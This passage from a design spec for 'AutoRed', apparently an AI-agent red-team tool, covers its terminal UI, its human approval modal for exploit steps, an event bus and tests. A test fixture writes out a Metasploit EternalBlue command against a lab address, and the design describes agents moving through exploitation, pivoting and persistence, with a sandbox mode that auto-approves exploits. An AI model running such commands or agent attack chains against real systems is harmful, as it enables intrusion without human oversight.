    def on_mount(self) -> None:
        if self.engagement_id:
            self.push_screen(DashboardScreen(self.engagement_id, self.event_queue))
        else:
            self.push_screen(EngagementListScreen())  # Phase 6
```

#### DashboardScreen

```python
# autored/tui/screens/dashboard.py
from textual.app import ComposeResult
from textual.containers import Horizontal, Vertical
from textual.widgets import (
    Static, Header, Footer, RichLog, DataTable, ProgressBar, Label
)
from textual.reactive import reactive
from datetime import datetime
from autored.state import EngagementState
from autored.tui.widgets.phase_indicator import PhaseIndicator
from autored.tui.widgets.agent_status import AgentStatusPanel
from autored.tui.widgets.activity_log import ActivityLog

class DashboardScreen(Container):
    """Main engagement dashboard."""

    CSS = """
    DashboardScreen {
        layout: vertical;
    }
    #top-row {
        height: 3;
    }
    #phase-indicator {
        width: 1fr;
        border: solid $accent;
        padding: 0 1;
    }
    #engagement-info {
        width: 1fr;
        border: solid $accent;
        padding: 0 1;
    }
    #middle-row {
        height: 1fr;
    }
    #agent-panel {
        width: 1fr;
        border: solid $accent;
    }
    #activity-log {
        width: 2fr;
        border: solid $accent;
    }
    #bottom-row {
        height: 3;
    }
    #progress {
        border: solid $accent;
    }
    """

    phase = reactive("recon")
    current_agent = reactive("")
    iteration = reactive(0)

    def __init__(self, engagement_id: str, event_queue: asyncio.Queue):
        super().__init__()
        self.engagement_id = engagement_id
        self.event_queue = event_queue

    def compose(self) -> ComposeResult:
        yield Header()
        with Horizontal(id="top-row"):
            yield PhaseIndicator(id="phase-indicator")
            yield Static(self._engagement_info_text(), id="engagement-info")
        with Horizontal(id="middle-row"):
            yield AgentStatusPanel(id="agent-panel")
            yield ActivityLog(id="activity-log")
        with Horizontal(id="bottom-row"):
            yield ProgressBar(id="progress", total=20)
        yield Footer()

    def on_mount(self) -> None:
        self.title = f"AutoRed — {self.engagement_id}"
        self.set_interval(0.5, self._poll_events)

    def _engagement_info_text(self) -> str:
        return (
            f"Engagement: [bold]{self.engagement_id}[/]\n"
            f"Started: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"
        )

    async def _poll_events(self) -> None:
        """Poll event queue for updates from orchestrator."""
        try:
            event = self.event_queue.get_nowait()
            await self._handle_event(event)
        except asyncio.QueueEmpty:
            pass

    async def _handle_event(self, event: dict) -> None:
        etype = event.get("type")
        if etype == "phase_change":
            self.phase = event["new_phase"]
            self.query_one(PhaseIndicator).update_phase(self.phase)
        elif etype == "agent_start":
            self.current_agent = event["agent"]
            self.query_one(AgentStatusPanel).update_agent(event)
        elif etype == "tool_call":
            self.query_one(ActivityLog).add_event(event)
        elif etype == "hitl_gate":
            # Push the HitL modal
            self.app.push_screen(HitLGateModal(event), self._handle_hitl_response)
        elif etype == "error":
            self.query_one(ActivityLog).add_error(event)

    def _handle_hitl_response(self, response: dict) -> None:
        """Called when HitL modal is dismissed."""
        # Response is forwarded back to orchestrator via reverse queue
        self.app.orchestrator_response_queue.put_nowait(response)
```

#### HitLGateModal (the critical widget)

```python
# autored/tui/screens/hitl_gate.py
from textual.app import ComposeResult
from textual.containers import Vertical, Horizontal
from textual.widgets import Static, Button, RichLog
from textual.binding import Binding
from textual.screen import ModalScreen
from rich.syntax import Syntax
from rich.table import Table
from rich.panel import Panel

class HitLGateModal(ModalScreen[dict]):
    """Modal that appears when an agent requests HitL approval."""

    CSS = """
    HitLGateModal {
        align: center middle;
    }
    #gate-container {
        width: 90;
        height: 30;
        border: solid $warning;
        background: $surface;
        padding: 1 2;
    }
    #gate-title {
        text-align: center;
        background: $warning;
        color: $text;
        padding: 0 1;
    }
    #gate-command {
        height: 10;
        border: solid $accent;
        margin: 1 0;
        padding: 0 1;
    }
    #gate-buttons {
        height: 3;
        align: center middle;
    }
    .gate-btn {
        margin: 0 1;
        width: 16;
    }
    #gate-btn-yes {
        background: $success;
    }
    #gate-btn-no {
        background: $error;
    }
    """

    BINDINGS = [
        Binding("y", "approve", "Approve", show=True),
        Binding("n", "reject", "Reject", show=True),
        Binding("e", "edit", "Edit", show=True),
        Binding("s", "skip", "Skip", show=True),
        Binding("escape", "reject", "Reject", show=False),
    ]

    def __init__(self, event: dict):
        super().__init__()
        self.event = event

    def compose(self) -> ComposeResult:
        with Vertical(id="gate-container"):
            yield Static(self._title_text(), id="gate-title")
            yield Static(self._details_text())
            with Vertical(id="gate-command"):
                yield RichLog()
            with Horizontal(id="gate-buttons"):
                yield Button("Approve [y]", id="gate-btn-yes", classes="gate-btn", variant="success")
                yield Button("Reject [n]", id="gate-btn-no", classes="gate-btn", variant="error")
                yield Button("Edit [e]", id="gate-btn-edit", classes="gate-btn", variant="warning")
                yield Button("Skip [s]", id="gate-btn-skip", classes="gate-btn")

    def on_mount(self) -> None:
        # Display the proposed command with syntax highlighting
        cmd_log = self.query_one(RichLog)
        cmd = self.event.get("command", "")
        language = self._detect_language(cmd)
        cmd_log.write(Syntax(cmd, language, theme="monokai", line_numbers=True))

    def _title_text(self) -> str:
        gate_type = self.event.get("gate_type", "exploit")
        return f"  ⚠  HITL GATE — {gate_type.upper()}  ⚠  "

    def _details_text(self) -> str:
        e = self.event
        table = Table(show_header=False, box=None)
        table.add_column("Field", style="bold cyan")
        table.add_column("Value")
        table.add_row("Target", e.get("target", ""))
        table.add_row("Technique", e.get("technique", ""))
        table.add_row("CVE", e.get("cve", "N/A"))
        table.add_row("Tool", e.get("tool", ""))
        table.add_row("Confidence", f"{e.get('confidence', 0):.0%}")
        table.add_row("Expected outcome", e.get("expected_outcome", ""))
        risks = e.get("risks", [])
        table.add_row("Risks", "\n".join(f"• {r}" for r in risks) if risks else "None listed")
        return str(Panel(table, title="Proposal"))

    def _detect_language(self, cmd: str) -> str:
        if cmd.startswith("nmap") or cmd.startswith("naabu"):
            return "bash"
        if "sqlmap" in cmd:
            return "bash"
        if "python" in cmd or "import " in cmd:
            return "python"
        if "powershell" in cmd or "Invoke-" in cmd:
            return "powershell"
        return "bash"

    # Action handlers for keybindings
    def action_approve(self) -> None:
        self.dismiss({"response": "approve", "modified_command": None})

    def action_reject(self) -> None:
        self.dismiss({"response": "reject", "modified_command": None})

    def action_edit(self) -> None:
        # Phase 6: full edit screen
        # Phase 3: prompt for inline edit
        self.app.push_screen(EditCommandScreen(self.event), self._after_edit)

    def action_skip(self) -> None:
        self.dismiss({"response": "skip", "modified_command": None})

    def _after_edit(self, result: dict) -> None:
        if result and result.get("modified_command"):
            self.dismiss({"response": "approve", "modified_command": result["modified_command"]})
        # else: stay on gate, user cancelled edit

    def on_button_pressed(self, event: Button.Pressed) -> None:
        btn_id = event.button.id
        if btn_id == "gate-btn-yes":
            self.action_approve()
        elif btn_id == "gate-btn-no":
            self.action_reject()
        elif btn_id == "gate-btn-edit":
            self.action_edit()
        elif btn_id == "gate-btn-skip":
            self.action_skip()
```

#### PhaseIndicator Widget

```python
# autored/tui/widgets/phase_indicator.py
from textual.widgets import Static
from textual.reactive import reactive

PHASES = ["recon", "vuln", "exploit", "postex", "lateral", "cleanup", "report", "done"]
PHASE_EMOJI = {
    "recon": "🔍",
    "vuln": "🎯",
    "exploit": "💥",
    "postex": "🏴",
    "lateral": "➡️",
    "cleanup": "🧹",
    "report": "📝",
    "done": "✓",
}

class PhaseIndicator(Static):
    """Horizontal bar showing current phase in the kill chain."""

    current_phase = reactive("recon")

    def render(self) -> str:
        idx = PHASES.index(self.current_phase) if self.current_phase in PHASES else 0
        parts = []
        for i, phase in enumerate(PHASES):
            emoji = PHASE_EMOJI[phase]
            if i < idx:
                parts.append(f"[dim]{emoji} {phase}[/]")
            elif i == idx:
                parts.append(f"[bold reverse]{emoji} {phase}[/]")
            else:
                parts.append(f"[dim]{emoji} {phase}[/]")
        return " → ".join(parts)

    def update_phase(self, phase: str) -> None:
        self.current_phase = phase
```

#### AgentStatusPanel Widget

```python
# autored/tui/widgets/agent_status.py
from textual.widgets import Static
from textual.reactive import reactive
from datetime import datetime

class AgentStatusPanel(Static):
    """Shows current agent name, what it's doing, how long."""

    agent_name = reactive("")
    task_description = reactive("")
    started_at = reactive(None)
    tool_calls = reactive(0)
    llm_calls = reactive(0)

    def render(self) -> str:
        if not self.agent_name:
            return "[dim]No active agent[/]"

        elapsed = ""
        if self.started_at:
            delta = datetime.utcnow() - self.started_at
            elapsed = f"{delta.seconds // 60}:{delta.seconds % 60:02d}"

        return (
            f"[bold cyan]{self.agent_name.upper()}[/] Agent\n"
            f"\n"
            f"Task: {self.task_description}\n"
            f"Elapsed: {elapsed}\n"
            f"Tool calls: {self.tool_calls}\n"
            f"LLM calls: {self.llm_calls}\n"
        )

    def update_agent(self, event: dict) -> None:
        self.agent_name = event["agent"]
        self.task_description = event.get("task", "")
        self.started_at = datetime.fromisoformat(event["started_at"])
        # Reset counters on new agent
        self.tool_calls = 0
        self.llm_calls = 0
```

#### ActivityLog Widget

```python
# autored/tui/widgets/activity_log.py
from textual.widgets import RichLog
from rich.text import Text
from datetime import datetime

class ActivityLog(RichLog):
    """Scrolling log of agent activity."""

    MAX_LINES = 1000

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs, max_lines=self.MAX_LINES, wrap=True, markup=True)

    def add_event(self, event: dict) -> None:
        ts = datetime.utcnow().strftime("%H:%M:%S")
        tool = event.get("tool", "")
        target = event.get("target", "")
        status = event.get("status", "")
        duration = event.get("duration_sec", 0)

        status_color = "green" if status == "success" else "red" if status == "error" else "yellow"
        line = Text(f"[{ts}] ", style="dim")
        line.append(Text(f"{tool} ", style="cyan"))
        line.append(Text(f"{target} ", style="white"))
        line.append(Text(f"({duration:.1f}s) ", style="dim"))
        line.append(Text(status, style=status_color))
        self.write(line)

    def add_error(self, event: dict) -> None:
        ts = datetime.utcnow().strftime("%H:%M:%S")
        line = Text(f"[{ts}] ", style="dim")
        line.append(Text("ERROR: ", style="bold red"))
        line.append(Text(event.get("message", ""), style="red"))
        self.write(line)
```

### 17.5 Phase 6 TUI — Additional Screens (Beyond Phase 3 Baseline)

#### EngagementListScreen

```python
# autored/tui/screens/engagement_list.py
from textual.app import ComposeResult
from textual.widgets import DataTable, Header, Footer
from textual.containers import Container
from autored.persistence.sqlite_saver import list_engagements

class EngagementListScreen(Container):
    """Browse past engagements."""

    BINDINGS = [
        Binding("enter", "open_engagement", "Open", show=True),
        Binding("r", "resume_engagement", "Resume", show=True),
        Binding("d", "delete_engagement", "Delete", show=True),
        Binding("n", "new_engagement", "New", show=True),
    ]

    def compose(self) -> ComposeResult:
        yield Header()
        yield DataTable(id="engagement-table")
        yield Footer()

    def on_mount(self) -> None:
        table = self.query_one(DataTable)
        table.add_columns("ID", "Target", "Phase", "Started", "Duration", "Findings")
        for eng in list_engagements():
            table.add_row(
                eng.id,
                eng.target,
                eng.phase,
                eng.start_ts,
                eng.duration or "—",
                str(eng.findings_count),
            )

    def action_open_engagement(self) -> None:
        # Get selected row, push dashboard
        ...

    def action_resume_engagement(self) -> None:
        ...
```

#### EvidenceViewerScreen

```python
# autored/tui/screens/evidence_viewer.py
from textual.app import ComposeResult
from textual.widgets import Static, TabbedContent, TabbedContentItem
from textual.containers import Container, ScrollableContainer
from pathlib import Path
from rich.syntax import Syntax
from rich.text import Text

class EvidenceViewerScreen(Container):
    """View captured evidence: screenshots, command output, etc."""

    def __init__(self, engagement_id: str):
        super().__init__()
        self.engagement_id = engagement_id
        self.evidence_dir = Path(f"engagements/{engagement_id}/evidence")

    def compose(self) -> ComposeResult:
        with TabbedContent():
            for evidence_file in sorted(self.evidence_dir.glob("*")):
                title = evidence_file.name
                with TabbedContentItem(title=title):
                    yield self._render_evidence(evidence_file)

    def _render_evidence(self, path: Path) -> Container:
        if path.suffix == ".png":
            # Textual can't render images natively; show metadata + path
            return Static(f"[Screenshot]\nPath: {path}\nSize: {path.stat().st_size} bytes")
        elif path.suffix in (".txt", ".log", ".out"):
            content = path.read_text(errors="ignore")
            return ScrollableContainer(Static(Syntax(content, "bash", theme="monokai")))
        else:
            return Static(f"[dim]Cannot render {path.suffix} files[/]")
```

#### StateInspectorScreen

```python
# autored/tui/screens/state_inspector.py
from textual.app import ComposeResult
from textual.widgets import Tree, Static
from textual.containers import Container
from autored.state import EngagementState
import json

class StateInspectorScreen(Container):
    """Browse full EngagementState as a tree."""

    def __init__(self, state: EngagementState):
        super().__init__()
        self.state = state

    def compose(self) -> ComposeResult:
        yield Static("[bold]Engagement State Inspector[/]", id="title")
        yield Tree("EngagementState", id="state-tree")

    def on_mount(self) -> None:
        tree = self.query_one(Tree)
        self._populate_tree(tree.root, self.state.dict())

    def _populate_tree(self, node, data, depth=0) -> None:
        if depth > 5:  # limit depth
            return
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, (dict, list)) and value:
                    branch = node.add(f"[cyan]{key}[/]")
                    self._populate_tree(branch, value, depth + 1)
                else:
                    display = self._format_value(value)
                    node.add_leaf(f"[cyan]{key}[/]: {display}")
        elif isinstance(data, list):
            for i, item in enumerate(data[:10]):  # cap at 10
                if isinstance(item, (dict, list)):
                    branch = node.add(f"[{i}]")
                    self._populate_tree(branch, item, depth + 1)
                else:
                    node.add_leaf(f"[{i}] {self._format_value(item)}")
            if len(data) > 10:
                node.add_leaf(f"[dim]... {len(data) - 10} more[/]")

    def _format_value(self, value) -> str:
        if value is None:
            return "[dim]null[/]"
        if isinstance(value, str) and len(value) > 50:
            return f'"{value[:47]}..."'
        return str(value)
```

#### FindingsTableScreen

```python
# autored/tui/screens/findings_table.py
from textual.app import ComposeResult
from textual.widgets import DataTable, Input, Select
from textual.containers import Horizontal, Container
from autored.state import EngagementState

class FindingsTableScreen(Container):
    """Sortable, filterable table of all findings."""

    BINDINGS = [
        Binding("s", "sort_by", "Sort", show=True),
        Binding("f", "focus_filter", "Filter", show=True),
        Binding("e", "view_evidence", "Evidence", show=True),
    ]

    def __init__(self, state: EngagementState):
        super().__init__()
        self.state = state

    def compose(self) -> ComposeResult:
        with Horizontal(id="filters"):
            yield Select(
                [("All", "all"), ("Critical", "critical"), ("High", "high"),
                 ("Medium", "medium"), ("Low", "low"), ("Info", "info")],
                id="severity-filter",
                value="all",
            )
            yield Input(placeholder="Filter by text...", id="text-filter")
        yield DataTable(id="findings-table")

    def on_mount(self) -> None:
        table = self.query_one(DataTable)
        table.add_columns("Host", "Port", "Service", "CVE", "Severity", "Title", "Discovered")
        self._populate()

    def _populate(self) -> None:
        table = self.query_one(DataTable)
        table.clear()
        severity_filter = self.query_one("#severity-filter").value
        text_filter = self.query_one("#text-filter").value.lower()

        for v in self.state.vulnerabilities:
            if severity_filter != "all" and v.severity != severity_filter:
                continue
            if text_filter and text_filter not in (v.title + v.description + (v.cve or "")).lower():
                continue
            table.add_row(
                v.host_ip,
                str(v.port or ""),
                v.service or "",
                v.cve or "",
                v.severity,
                v.title[:60],
                v.discovered_at.strftime("%H:%M"),
            )
```

### 17.6 Keybindings Reference (Full TUI)

| Key | Action | Screen |
|---|---|---|
| `q` | Quit app | Global |
| `d` | Go to dashboard | Global |
| `e` | Go to engagements list | Global |
| `l` | Go to log viewer | Global |
| `f` | Go to findings table | Global |
| `s` | Go to state inspector | Global |
| `?` | Help screen | Global |
| `y` | Approve HitL gate | HitL modal |
| `n` | Reject HitL gate | HitL modal |
| `e` | Edit HitL command | HitL modal |
| `s` | Skip to next hypothesis | HitL modal |
| `enter` | Open selected engagement | List |
| `r` | Resume selected engagement | List |
| `n` | New engagement | List |
| `tab` | Next field | Forms |
| `shift+tab` | Previous field | Forms |

### 17.7 Event Bus — Orchestrator ↔ TUI Communication

```python
# autored/tui/event_bus.py
import asyncio
from dataclasses import dataclass, field
from typing import Any

@dataclass
class EventBus:
    """Bi-directional event bus between orchestrator and TUI."""
    orchestrator_to_tui: asyncio.Queue = field(default_factory=asyncio.Queue)
    tui_to_orchestrator: asyncio.Queue = field(default_factory=asyncio.Queue)

    async def emit_to_tui(self, event: dict) -> None:
        await self.orchestrator_to_tui.put(event)

    async def emit_to_orchestrator(self, event: dict) -> None:
        await self.tui_to_orchestrator.put(event)

    async def wait_for_tui_response(self) -> dict:
        """Called by orchestrator when paused at HitL gate."""
        return await self.tui_to_orchestrator.get()

# Event types (orchestrator → TUI):
# {"type": "phase_change", "new_phase": "vuln"}
# {"type": "agent_start", "agent": "recon", "task": "...", "started_at": "..."}
# {"type": "agent_done", "agent": "recon", "duration_sec": 45.2}
# {"type": "tool_call", "tool": "nmap", "target": "10.10.10.5", "status": "success", "duration_sec": 12.3}
# {"type": "llm_call", "model": "claude-sonnet-4-5", "tokens": 1234, "duration_sec": 3.2}
# {"type": "hitl_gate", "gate_type": "exploit", "target": "...", "technique": "...", "command": "...", ...}
# {"type": "error", "category": "tool", "message": "...", "agent": "..."}
# {"type": "finding", "finding": {...}}    # new finding discovered

# Event types (TUI → orchestrator):
# {"response": "approve", "modified_command": None}
# {"response": "reject", "modified_command": None}
# {"response": "skip", "modified_command": None}
# {"response": "edit", "modified_command": "...edited command..."}
# {"response": "pause"}    # operator wants to pause
# {"response": "abort"}    # operator wants to abort
```

### 17.8 Orchestrator Integration — Emitting Events

The LangGraph nodes emit events to the bus. The HitL gate specifically blocks until the TUI responds:

```python
# autored/agents/exploit.py — updated to use event bus
async def exploit_node(state: EngagementState) -> dict:
    bus = state.event_bus  # injected into state

    for hypothesis in sorted(state.attack_hypotheses, key=lambda h: h["rank"]):
        # Emit HitL gate event
        await bus.emit_to_tui({
            "type": "hitl_gate",
            "gate_type": "exploit",
            "target": hypothesis["target"],
            "technique": hypothesis["technique"],
            "cve": hypothesis.get("cve"),
            "tool": hypothesis["tool"],
            "tool_module": hypothesis.get("tool_module"),
            "confidence": hypothesis["confidence"],
            "expected_outcome": hypothesis["expected_outcome"],
            "risks": hypothesis["risks"],
            "command": hypothesis.get("command_preview", ""),
        })

        # Block until TUI responds
        response = await bus.wait_for_tui_response()

        if response["response"] == "reject":
            continue
        elif response["response"] == "skip":
            continue
        elif response["response"] == "approve":
            cmd = response.get("modified_command") or hypothesis.get("command_preview")
            # ... execute
        elif response["response"] == "abort":
            return {"phase": "report", "errors": [...]}
```

### 17.9 Sandbox Mode Behavior

In sandbox mode (`hitl_mode: "auto_approve"`), the TUI **still runs** — it just doesn't pause at HitL gates. The gate event is emitted, the TUI displays it for ~1 second in the activity log (so you can see what would have been asked), then auto-approves:

```python
# autored/tui/screens/dashboard.py — modified _handle_event
async def _handle_event(self, event: dict) -> None:
    etype = event.get("type")
    if etype == "hitl_gate":
        if self.app.roe.hitl_mode == "auto_approve":
            # Log it, auto-approve
            self.query_one(ActivityLog).add_event({
                **event,
                "status": "auto-approved",
                "duration_sec": 0,
            })
            self.app.orchestrator_response_queue.put_nowait({
                "response": "approve",
                "modified_command": None,
            })
        else:
            # Pause and show modal
            self.app.push_screen(HitLGateModal(event), self._handle_hitl_response)
```

### 17.10 CSS / Styling (`autored/tui/app.tcss`)

```css
/* Global TUI styling */
App {
    background: $surface;
    color: $text;
}

/* Phase indicator gradient effect */
PhaseIndicator {
    color: $primary;
    text-align: center;
    padding: 0 1;
}

/* Activity log monospace */
ActivityLog {
    background: $panel;
    border: solid $accent;
    padding: 0 1;
}

/* HitL modal warning glow */
HitLGateModal #gate-title {
    text-style: bold;
    text-align: center;
}

/* Findings table severity colors */
DataTable > .datatable--header {
    background: $primary;
    color: $text;
}

/* Progress bar pulsing during active phase */
ProgressBar:-running {
    color: $success;
}
```

### 17.11 TUI Testing

TUI tests use `textual.testing` framework:

```python
# tests/integration/tui/test_hitl_gate.py
import pytest
from textual.testing import Pilot
from autored.tui.app import AutoRedApp
from autored.tui.screens.hitl_gate import HitLGateModal

@pytest.mark.asyncio
async def test_hitl_gate_approve():
    """Test that pressing 'y' on HitL gate returns approve response."""
    app = AutoRedApp(engagement_id="test-001")
    async with app.run_test() as pilot:
        # Simulate HitL gate event
        app.event_queue.put_nowait({
            "type": "hitl_gate",
            "gate_type": "exploit",
            "target": "10.10.10.5",
            "technique": "EternalBlue",
            "cve": "CVE-2017-0144",
            "tool": "metasploit",
            "confidence": 0.85,
            "expected_outcome": "SYSTEM shell",
            "risks": ["may crash SMB service"],
            "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.5; run'",
        })
        await pilot.pause()
        # Modal should be visible
        assert isinstance(app.screen, HitLGateModal)
        # Press 'y' to approve
        await pilot.press("y")
        await pilot.pause()
        # Check response was sent back
        response = app.orchestrator_response_queue.get_nowait()
        assert response["response"] == "approve"
```

### 17.12 Ship Criteria (Phase 6 additions)

These criteria are **in addition** to the Phase 3 TUI criteria already in §13.3 (basic TUI ships in Phase 3). Phase 6 adds the remaining screens:

**Phase 6 adds:**
- [ ] EngagementListScreen browses/resumes past engagements
- [ ] EvidenceViewerScreen displays captured evidence
- [ ] StateInspectorScreen browses full EngagementState tree
- [ ] FindingsTableScreen sorts/filters all findings
- [ ] LogViewerScreen tails operational log in real-time
- [ ] RoEEditorScreen validates RoE YAML
- [ ] AttackGraphScreen renders pivot paths
- [ ] All screens accessible via keybindings
- [ ] CSS theming applied consistently

---

## Appendix A — Glossary

- **Engagement:** A single red-team engagement against a scoped target. Has unique `engagement_id`, runs from `autored run` until Report Agent exits.
- **Sub-engagement:** Child engagement spawned by Lateral Agent. Has own `engagement_id` and `parent_engagement_id`.
- **Primary Agent:** One of 8 LangGraph nodes (Recon, Vuln, Exploit, Post-Ex, Lateral, Cleanup, Report, RoE-Guard).
- **Sub-Agent:** Specialist agent called by primary agent. Stateless, typed, 27 total.
- **HitL:** Human-in-the-Loop. Three gates: exploit, post-ex (per sub-activity), lateral (per pivot).
- **RoE:** Rules of Engagement. YAML config, loaded at engagement start, immutable after.
- **Sandbox Mode:** RoE config with allow-all + auto_approve. Default for lab/HTB work.
- **Foothold:** Successfully exploited access point on a target host. Recorded in `footholds[]`.
- **Pivot:** Use of harvested credentials/trust to access a new host. Recorded in `pivots[]`.
- **Persistence Artifact:** Modification made to maintain access. Recorded in `persistence_artifacts[]` with exact removal command for Cleanup Agent.

---

## End of Spec

This spec will be implemented in six phases, each with its own implementation plan written per the Superpowers `writing-plans` skill. No code begins until the phase's plan is approved.
